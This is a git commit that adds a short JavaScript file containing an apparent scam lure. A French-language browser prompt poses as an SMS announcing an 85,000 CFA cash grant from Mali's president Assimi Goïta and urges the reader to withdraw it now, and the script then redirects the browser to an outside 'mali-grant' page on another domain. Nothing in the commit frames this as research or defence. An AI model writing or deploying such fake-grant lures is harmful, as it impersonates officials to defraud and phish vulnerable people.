466fdb7f4a22bc49557fee609593f724e9863c25
ekperikpe <ekperikpe588@gmail.com>
2025-09-03 07:32:23 +0100

    Create mali-active.js

---
+++ mali-active.js
@@ -0,0 +1,5 @@
+var password = 'RETIRER 85 000 CFA'
+password=prompt('SMS: Félicitations, vous êtes parmi les sélectionnés pour recevoir une subvention en espèces de 85 000 CFA du président Assimi Goïta, appuyez sur Ok pour retirer maintenant ','RETIRER 85 000 CFA');
+if (password != 'RETIRER 85 000 CFA') {
+location.href='https://sharpupdate.org/mali-grant.html';
+}
